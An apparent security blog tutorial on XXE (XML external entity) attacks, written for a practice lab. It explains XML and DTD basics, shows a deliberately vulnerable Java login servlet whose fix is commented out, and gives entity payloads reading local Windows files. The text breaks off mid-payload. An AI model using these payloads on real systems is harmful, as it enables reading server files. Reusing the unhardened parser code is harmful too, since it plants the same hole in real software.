@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		
+<title>XXE漏洞分析与挖掘-信息安全博客</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/favicon1.ico">
+
+
+<meta name="keywords" content="靶场,XXE,">
+<meta name="description" content="">
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+	<meta name="generator" content="Hexo 5.4.0"></head>
+
+	<body>
+		
+<link rel="stylesheet" href="/css/page.css">
+
+
+<link rel="stylesheet" href="/css/page_cente.css">
+
+
+<link rel="stylesheet" href="/css/atom-one-dark.css">
+
+
+<link rel="stylesheet" href="/css/header.css">
+
+	<div class="header">
+		<div class="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/logo.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										主页
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										文章
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										分类
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										标签
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										友情链接
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										关于
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>TRRQ</h2>
+    </div>
+    <ul>
+        
+        <li>
+            <a href="/">主页</a>
+        </li>
+        
+        <li>
+            <a href="/archives">文章</a>
+        </li>
+        
+        <li>
+            <a href="/categories">分类</a>
+        </li>
+        
+        <li>
+            <a href="/tags">标签</a>
+        </li>
+        
+        <li>
+            <a href="/links">友情链接</a>
+        </li>
+        
+        <li>
+            <a href="/about">关于</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
+    </div>
+</div>
+<div class='shelter'
+    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'>
+</div>
+<style>
+    .sidebar {
+        width: 0;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        background: #fff;
+        z-index: 999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
+    }
+
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
+    }
+</style>
+
+<script>
+    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
+</script>
+		<script>
+			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
+		</script>
+<div class="header-bg bg-content-img">
+    <div class="bg-content">
+        <ul class="tag">
+            
+            
+            <li><a href="/tags/靶场">靶场</a></li>
+            
+            <li><a href="/tags/XXE">XXE</a></li>
+            
+            
+        </ul>
+        <h1>XXE漏洞分析与挖掘</h1>
+        <div class="article-info">
+            <div class="article-author">
+                
+                <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                    xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                    <path
+                        d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                        p-id="2902" fill="#ffffff"></path>
+                </svg>
+                
+                <span> <a href="">TRRQ</a></span>
+                <p>2022-04-06 09:35:56</p>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="article-content">
+    <div id="article" class="content">
+        <h1 id="XXE漏洞分析与挖掘"><a href="#XXE漏洞分析与挖掘" class="headerlink" title="XXE漏洞分析与挖掘"></a>XXE漏洞分析与挖掘</h1><h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML的全称是EXtensible Markup Language，可扩展标记语言</p>
+<p>编写XML就是编写标签，与HTML类似，扩展名.xml</p>
+<p>有良好的人机可读性</p>
+<p>与HTML差别在于，这几个方面</p>
+<ul>
+<li>XML没有预定义标签，HTML存在大量预定义标签</li>
+<li>XML重在保存与传输，HTML用于显示信息</li>
+</ul>
+</br>
+
+<p><strong>XML文档结构</strong></p>
+<ul>
+<li>第一行必须是XML声明</li>
+<li>有且只有一个根节点</li>
+<li>XML标签的书写规则与HTML相同</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>version：表示版本号1.0</p>
+<p>encoding：表示设置字符集为UTF-8</p>
+</br>
+
+<p><strong>实例</strong></p>
+<p>使用XML编写一个人力资源管理系统</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;!-- 人力资源管理系统 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">employee</span> <span class="hljs-attr">no</span>=<span class="hljs-string">&quot;3309&quot;</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>31<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">salary</span>&gt;</span>4000<span class="hljs-tag">&lt;/<span class="hljs-name">salary</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">department</span>&gt;</span>会计部<span class="hljs-tag">&lt;/<span class="hljs-name">department</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>xx大厦-B103<span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">employee</span>&gt;</span><br>	<br>	<span class="hljs-tag">&lt;<span class="hljs-name">employee</span> <span class="hljs-attr">no</span>=<span class="hljs-string">&quot;3310&quot;</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>23<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">salary</span>&gt;</span>3000<span class="hljs-tag">&lt;/<span class="hljs-name">salary</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">department</span>&gt;</span>工程部<span class="hljs-tag">&lt;/<span class="hljs-name">department</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>xx大厦-B104<span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">employee</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">hr</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h2 id="XML语法约束"><a href="#XML语法约束" class="headerlink" title="XML语法约束"></a>XML语法约束</h2><p>XML文档结构正确，但可能不是有效的。</p>
+<p>例如员工档案不能出现”植物品种”标签，XML语法约束就是用于规定XML文档允许出现哪些标签</p>
+</br>
+
+<p><strong>DTD</strong></p>
+<p>Document Type Definition</p>
+<p>文档类型定义是一种简单易用的语法约束方式</p>
+<p>扩展名为.dtd</p>
+</br>
+
+<p>hr.dtd</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">hr</span> (<span class="hljs-meta-keyword">employee</span>+)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">employee</span> (<span class="hljs-meta-keyword">name</span>,<span class="hljs-meta-keyword">age</span>,<span class="hljs-meta-keyword">salary</span>,<span class="hljs-meta-keyword">department</span>)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">employee</span> <span class="hljs-meta-keyword">no</span> <span class="hljs-meta-keyword">CDATA</span> <span class="hljs-meta-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">name</span>(<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br>....<br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>定义节点数量</p>
+ <figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 定义hr节点下只允许1个employee子节点 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">hr</span>(<span class="hljs-meta-keyword">employee</span>)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义hr节点下0...n个employee子节点 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">hr</span>(<span class="hljs-meta-keyword">employee</span>*)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义hr节点下最多1个employee子节点 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">hr</span>(<span class="hljs-meta-keyword">employee</span>?)&gt;</span><br><br><span class="hljs-comment">&lt;!-- hr节点hr下最少出现1个employee子节点 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">hr</span>(<span class="hljs-meta-keyword">employee</span>+)&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>引用DTD文件</p>
+<p>在XML中使用&lt;!DOCTYPE&gt;标签来引用DTD文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 书写格式 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE 根节点 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;dtd文件路径&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 实例 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hr</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;hr.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>这是包含 DTD 的 “hr.dtd” 文件：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">hr</span> (<span class="hljs-meta-keyword">employee</span>+)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">employee</span> (<span class="hljs-meta-keyword">name</span>,<span class="hljs-meta-keyword">age</span>,<span class="hljs-meta-keyword">salary</span>,<span class="hljs-meta-keyword">department</span>)&gt;</span><br><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-meta-keyword">employee</span> <span class="hljs-meta-keyword">no</span> <span class="hljs-meta-keyword">CDATA</span> <span class="hljs-meta-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">name</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">age</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">salary</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">department</span> (<span class="hljs-meta-keyword">dname</span>,<span class="hljs-meta-keyword">address</span>)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">dname</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">address</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p><strong>实例</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs XML"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;!-- 定义hr节点下最少出现1个employee子节点 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">hr</span> (<span class="hljs-meta-keyword">employee</span>+)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义 note 元素有四个元素：&quot;name,age,salary,department&quot; --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">employee</span> (<span class="hljs-meta-keyword">name</span>,<span class="hljs-meta-keyword">age</span>,<span class="hljs-meta-keyword">salary</span>,<span class="hljs-meta-keyword">department</span>)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 增加no属性，CDATA表示属性值解析时不会被解析器解析 --&gt;</span><br><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-meta-keyword">employee</span> <span class="hljs-meta-keyword">no</span> <span class="hljs-meta-keyword">CDATA</span> <span class="hljs-meta-string">&quot;&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义name标签体只能是文本，#PCDATA代表文本元素。 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">name</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义age标签体只能是文本，#PCDATA代表文本元素。 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">age</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义salary标签体只能是文本，#PCDATA代表文本元素。 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">salary</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义 department 元素有四个元素：&quot;dname,address&quot; --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">department</span> (<span class="hljs-meta-keyword">dname</span>,<span class="hljs-meta-keyword">address</span>)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义dname标签体只能是文本，#PCDATA代表文本元素。 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">dname</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br><br><span class="hljs-comment">&lt;!-- 定义address标签体只能是文本，#PCDATA代表文本元素。 --&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">address</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p><strong>实例</strong></p>
+<p>使用dtd来验证XML</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span>      (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">heading</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h2 id="XML攻击与危害"><a href="#XML攻击与危害" class="headerlink" title="XML攻击与危害"></a>XML攻击与危害</h2><p><strong>原理</strong></p>
+<p>XXE（外部实体注入）是XML外部实体注入。</p>
+<p>当应用程序允许引用外部实体时，通过XXE，攻击者可以实现任意文件读取，DOS拒绝服务攻击以及代理扫描内网等</p>
+<p><strong>靶场</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p>
+</br>
+
+<p><strong>代码</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> me.gv7.xxe;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> org.w3c.dom.Document;<br><span class="hljs-keyword">import</span> org.w3c.dom.NodeList;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><br><span class="hljs-keyword">import</span> javax.xml.parsers.*;<br><br><span class="hljs-meta">@WebServlet(&quot;/doLoginServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br>	<br>	<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String USERNAME = <span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-comment">//账号</span><br>	<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String PASSWORD = <span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-comment">//密码</span><br>	<br>	<span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-comment">//漏洞点</span><br>        <span class="hljs-comment">//得到创建 DOM 解析器的工厂</span><br>		DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     <br>        DocumentBuilder db;<br>        String result=<span class="hljs-string">&quot;&quot;</span>;<br>		<span class="hljs-keyword">try</span> &#123;<br>			db = dbf.newDocumentBuilder();<br>			<span class="hljs-comment">/*修复代码*/</span> <br>			<span class="hljs-comment">//dbf.setExpandEntityReferences(false);</span><br>            <br>            <span class="hljs-comment">//调用 DOM 解析器对象的 parse() 方法解析 XML 文档，得到代表整个文档的 Document 对象</span><br>			Document doc = db.parse(request.getInputStream());<br>            <span class="hljs-comment">//获取username标签值</span><br>			String username = getValueByTagName(doc,<span class="hljs-string">&quot;username&quot;</span>);<br>            <span class="hljs-comment">//获取password标签值</span><br>			String password = getValueByTagName(doc,<span class="hljs-string">&quot;password&quot;</span>);<br>            <span class="hljs-comment">//判断</span><br>			<span class="hljs-keyword">if</span>(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;<br>				result = String.format(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,username);<br>			&#125;<span class="hljs-keyword">else</span>&#123;<br>				result = String.format(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,username);<br>			&#125;<br>		&#125; <span class="hljs-keyword">catch</span> (ParserConfigurationException e) &#123;<br>			e.printStackTrace();<br>			result = String.format(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,e.getMessage());<br>		&#125; <span class="hljs-keyword">catch</span> (SAXException e) &#123;<br>			e.printStackTrace();<br>			result = String.format(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,e.getMessage());<br>		&#125;<br>		response.setContentType(<span class="hljs-string">&quot;text/xml;charset=UTF-8&quot;</span>);<br>		response.getWriter().append(result);<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>		doGet(request, response);<br>	&#125;<br><br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * </span><br><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> doc 文档</span><br><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> tagName 标签名</span><br><span class="hljs-comment"> 	 * <span class="hljs-doctag">@return</span> 标签值</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getValueByTagName</span><span class="hljs-params">(Document doc, String tagName)</span></span>&#123;  <br>        <span class="hljs-keyword">if</span>(doc == <span class="hljs-keyword">null</span> || tagName.equals(<span class="hljs-keyword">null</span>))&#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;  <br>        &#125;  <br>        NodeList pl = doc.getElementsByTagName(tagName);  <br>        <span class="hljs-keyword">if</span>(pl != <span class="hljs-keyword">null</span> &amp;&amp; pl.getLength() &gt; <span class="hljs-number">0</span>)&#123;  <br>            <span class="hljs-keyword">return</span> pl.item(<span class="hljs-number">0</span>).getTextContent();  <br>        &#125; <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>尝试登录抓包</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220406113249.png"></p>
+<p>可以看到我们传入的账户和密码都是在标签中包裹</p>
+<p>尝试插入payload</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220406113419.png"></p>
+<p>分析payload</p>
+<h3 id="有回显型"><a href="#有回显型" class="headerlink" title="有回显型"></a>有回显型</h3><p>file协议</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-comment">&lt;!-- 定义此文档是test1类型的文档。--&gt;</span><br><span class="hljs-comment">&lt;!-- 定义test内部实体名称，file后面接你要读的文件。--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test1</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">test</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-comment">&lt;!-- xxx标签名字要使用数据包中的原生标签，&amp;test引用 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>或者是使用netdoc协议i</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">creds</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;netdoc:///c:/windows/system.ini&quot;</span>&gt;</span>]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span 